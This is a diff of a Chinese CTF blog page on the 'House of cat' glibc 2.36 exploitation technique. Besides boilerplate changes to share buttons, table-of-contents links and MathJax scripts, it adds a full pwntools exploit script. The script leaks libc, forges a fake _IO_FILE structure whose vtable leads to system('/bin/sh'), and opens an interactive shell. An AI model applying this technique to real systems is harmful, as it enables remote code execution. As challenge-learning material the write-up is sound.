-<span id="cb8-80"><a href="#cb8-80" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span><span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>               <span class="co">#0x82  _vtable_offset</span></span>
-<span id="cb8-81"><a href="#cb8-81" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span><span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span><span class="op">*</span><span class="dv">5</span>             <span class="co">#0x83  _shortbuf</span></span>
-<span id="cb8-82"><a href="#cb8-82" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(fake_io_addr<span class="op">+</span><span class="bn">0x1000</span>)                <span class="co">#0x88  _lock</span></span>
-<span id="cb8-83"><a href="#cb8-83" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x90  _offset</span></span>
-<span id="cb8-84"><a href="#cb8-84" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0x98  _codecvt</span></span>
-<span id="cb8-85"><a href="#cb8-85" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(fake_io_addr<span class="op">+</span><span class="bn">0x30</span>)<span class="co">#0xa0  _wide_data       rax1 fake_io_addr+0x30</span></span>
-<span id="cb8-86"><a href="#cb8-86" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0xa8  _freeres_list</span></span>
-<span id="cb8-87"><a href="#cb8-87" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0xb0  _freeres_bufr</span></span>
-<span id="cb8-88"><a href="#cb8-88" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(<span class="dv">0</span>)                <span class="co">#0xb8  __pad5</span></span>
-<span id="cb8-89"><a href="#cb8-89" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span><span class="st">b&#39;</span><span class="ch">\x00\x00\x00\x00</span><span class="st">&#39;</span>   <span class="co">#0xc0  _mode           rdx</span></span>
-<span id="cb8-90"><a href="#cb8-90" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span><span class="st">b&#39;</span><span class="ch">\x00\x00\x00\x00</span><span class="st">&#39;</span><span class="op">+</span> p64(<span class="dv">0</span>) <span class="op">*</span> <span class="dv">2</span> <span class="co">#0xc4  _unused2</span></span>
-<span id="cb8-91"><a href="#cb8-91" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(libc.sym[<span class="st">&#39;_IO_wfile_jumps&#39;</span>] <span class="op">+</span> <span class="bn">0x30</span>)       <span class="co">#0xd8  vtable</span></span>
-<span id="cb8-92"><a href="#cb8-92" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(fake_io_addr<span class="op">+</span><span class="bn">0x30</span><span class="op">+</span><span class="bn">0xe0</span><span class="op">+</span><span class="bn">0x40</span>).rjust(<span class="bn">0x38</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)                             <span class="co">#0xe0</span></span>
-<span id="cb8-93"><a href="#cb8-93" aria-hidden="true" tabindex="-1"></a>fake_IO_FILE<span class="op">+=</span>p64(libc.sym[<span class="st">&#39;system&#39;</span>]).rjust(<span class="bn">0x58</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)</span>
-<span id="cb8-94"><a href="#cb8-94" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-95"><a href="#cb8-95" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-96"><a href="#cb8-96" aria-hidden="true" tabindex="-1"></a>pause()</span>
-<span id="cb8-97"><a href="#cb8-97" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb8-98"><a href="#cb8-98" aria-hidden="true" tabindex="-1"></a>r.sendafter(<span class="st">b&#39;What do you think is appropriate to put into the gitf?</span><span class="ch">\n</span><span class="st">&#39;</span>,fake_IO_FILE)</span>
-<span id="cb8-99"><a href="#cb8-99" aria-hidden="true" tabindex="-1"></a>r.interactive()</span></code></pre></div>
+<pre><code class="language-python">from pwn import * 
+from pwn import p64,u64
+from LibcSearcher import *
+
+debug = 1
+gdb_is = 1
+elf_path = &quot;./vuln&quot;
+# context(arch='i386',os = 'linux')
+context(arch='amd64',os = 'linux', log_level='DEBUG')
+if debug:
+    context.terminal = ['wt.exe','nt','Ubuntu','-c']
+    if gdb_is:
+        r = gdb.debug('./vuln','set debug-file-directory ./.debug/')
+        # gdb.attach(r,'b* 0x4012ed')
+        # gdb.attach(r)
+        # pause()
+        pass
+    else:
+        r = process(&quot;./vuln&quot;)
+    
+else:
+    host = &quot;192.168.0.111:53783&quot;
+    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
+    gdb_is =0
+
+
+
+def show_addr(name,addr):
+      success(f'&#123;name&#125; = &#123;hex(addr)&#125;')
+
+def revc_addr(r:process,name:str, until:bytes =b'\x7f',offset:int = 0,addrType:str ='bytes')-&gt;int:
+    if type(until) == str:
+        until = until.encode()
+    if addrType == 'bytes':
+        if not offset:
+            addr = u64(r.recvuntil(until).ljust(8,b'\x00'))
+        else:
+            addr = u64(r.recvuntil(until)[:offset].ljust(8,b'\x00'))
+    elif addrType == 'str':
+        addr = int(r.recvuntil(until)[2:offset],16)
+
+    show_addr(name,addr)
+    return addr
+    
+libc = ELF('./libc.so.6')
+elf = ELF(elf_path)
+rop = ROP(elf)
+r.recvuntil(b'the box of it looks like this: ')
+libc.address = revc_addr(r,b'_IO_list_all','\n',-1,'str') - 0x1f7660
+size = 0x20000000
+
+
+r.sendlineafter(b'put into the gift?\n',str(size).encode())
+show_addr('libc.address',libc.address)
+
+# pause()
+# house_of_cat
+fake_io_addr = libc.address - 0x20003ff0 # 伪造的fake_IO结构体的地址
+show_addr('fake_io_addr',fake_io_addr)
+next_chain = 0
+
+fake_IO_FILE=b'/bin/sh\x00'         #0x0   _flags =&gt; rdi
+fake_IO_FILE+=p64(0)                #0x8   _IO_read_ptr
+fake_IO_FILE+=p64(0)                #0x10  _IO_read_end
+fake_IO_FILE+=p64(0)                #0x18  _IO_read_base
+fake_IO_FILE+=p64(0)                #0x20  _IO_write_base
+fake_IO_FILE+=p64(1)                #0x28  _IO_write_ptr
+fake_IO_FILE+=p64(0)                #0x30  _IO_write_end
+fake_IO_FILE+=p64(0)                #0x38  _IO_buf_base
+fake_IO_FILE+=p64(0)                #0x40  _IO_buf_end
+fake_IO_FILE+=p64(0)                #0x48  _IO_save_base
+fake_IO_FILE+=p64(0x100)            #0x50  _IO_backup_base
+fake_IO_FILE+=p64(0)                #0x58  _IO_save_end
+fake_IO_FILE+=p64(0)                #0x60  _markers
+fake_IO_FILE+=p64(0)                #0x68  _chain
+fake_IO_FILE+=b'\x00'*4             #0x70  _fileno
+fake_IO_FILE+=b'\x00'*4             #0x74  _flags2
+fake_IO_FILE+=p64(0)                #0x78  _old_offset
+fake_IO_FILE+=b'\x00\x00'           #0x80  _cur_column
+fake_IO_FILE+=b'\x00'               #0x82  _vtable_offset
+fake_IO_FILE+=b'\x00'*5             #0x83  _shortbuf
+fake_IO_FILE+=p64(fake_io_addr+0x1000)                #0x88  _lock
+fake_IO_FILE+=p64(0)                #0x90  _offset
+fake_IO_FILE+=p64(0)                #0x98  _codecvt
+fake_IO_FILE+=p64(fake_io_addr+0x30)#0xa0  _wide_data       rax1 fake_io_addr+0x30
+fake_IO_FILE+=p64(0)                #0xa8  _freeres_list
+fake_IO_FILE+=p64(0)                #0xb0  _freeres_bufr
+fake_IO_FILE+=p64(0)                #0xb8  __pad5
+fake_IO_FILE+=b'\x00\x00\x00\x00'   #0xc0  _mode           rdx
+fake_IO_FILE+=b'\x00\x00\x00\x00'+ p64(0) * 2 #0xc4  _unused2
+fake_IO_FILE+=p64(libc.sym['_IO_wfile_jumps'] + 0x30)       #0xd8  vtable
+fake_IO_FILE+=p64(fake_io_addr+0x30+0xe0+0x40).rjust(0x38,b'\x00')                             #0xe0
+fake_IO_FILE+=p64(libc.sym['system']).rjust(0x58,b'\x00')
+
+
+pause()
+
+r.sendafter(b'What do you think is appropriate to put into the gitf?\n',fake_IO_FILE)
+r.interactive()
+</code></pre>
 
 
         <hr>
@@ -607,61 +595,7 @@ _IO_list_all来打印结构。</p>
         </ul>
 
         
-        <!-- tip start -->
-        <!-- tip -->
-<!-- tip start -->
-<div class="tip">
-  <!-- <p>
-    
-      If you like this blog or find it useful for you, you are welcome to comment on it. You are also welcome to share this blog, so that more people can participate in it. If the images used in the blog infringe your copyright, please contact the author to delete them. Thank you !
-    
-  </p> -->
-</div>
-<!-- tip end -->
 
-        <!-- tip end -->
-        
-
-        
-        <!-- Sharing Srtart -->
-        <!-- Social Social Share Post -->
-<!-- Docs:https://github.com/overtrue/share.js -->
-
-<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
-  <ul class="list-inline text-center social-share-ul">
-    <li class="social-share-li">
-      <a target="_blank" class="social-share-icon icon-twitter">
-        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
-      </a>
-    </li>
-    <li class="social-share-li">
-      <a class="social-share-icon icon-wechat">
-        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
-      </a>
-    </li>
-    <li class="social-share-li">
-      <a target="_blank" class="social-share-icon icon-weibo">
-        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
-      </a>
-    </li>
-    <li class="social-share-li">
-      <a target="_blank" class="social-share-icon icon-qq">
-        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
-      </a>
-    </li>
-    <li class="social-share-li">
-      <a target="_blank" class="social-share-icon" href="mailto:?subject=House of cat&body=Hi,I found this website and thought you might like it https://sagiring.github.io/cn/Sagiring_markdown/House of cat/">
-        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
-      </a>
-    </li>
-  </ul>
-</div>
-
-<!-- css & js -->
-<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
-<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
-
-        <!-- Sharing End -->
         
         <hr>
 
@@ -738,7 +672,7 @@ _IO_list_all来打印结构。</p>
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#house-of-cat"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">House of cat</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">题目</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#glibc%E7%89%88%E6%9C%AC-2.36"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">glibc版本 2.36</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"><span class="toc-nav-number">1.1.2.</span> <span class="toc-nav-text">程序逻辑</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">解题思路</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#io_file_plus%E7%BB%93%E6%9E%84"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">_IO_FILE_plus结构</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#house-of-cat-1"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">House of cat</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%8F%A6%E5%A4%96"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">另外</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#exp"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">Exp</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">House of cat</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">题目</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#glibc%E7%89%88%E6%9C%AC-2-36"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">glibc版本 2.36</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"><span class="toc-nav-number">1.1.2.</span> <span class="toc-nav-text">程序逻辑</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">解题思路</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#IO-FILE-plus%E7%BB%93%E6%9E%84"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">_IO_FILE_plus结构</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#House-of-cat"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">House of cat</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%8F%A6%E5%A4%96"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">另外</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Exp"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">Exp</span></a></li></ol></li></ol>
         
         </div>
       </aside>
@@ -858,24 +792,11 @@ _IO_list_all来打印结构。</p>
   
 
   
-    <!-- Line start -->
-    <script async="text/javascript" src="/js/line.js"></script>
-    <!-- Line end -->
-  
 
 
 
 
 
-
-  <!-- viewer start -->
-  <!-- viewer start (Picture preview) -->
-  
-    <script async="async" type="text/javascript" src="/js/viewer/viewer.min.js"></script>
-    <script async="async" type="text/javascript" src="/js/viewer/pic-viewer.js"></script>
-  
-
-  <!-- viewer end -->
 
 
 <script>
@@ -1262,6 +1183,21 @@ start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </scrip
 		<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
 
 		
-	</body>
+	<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
 </html>
 
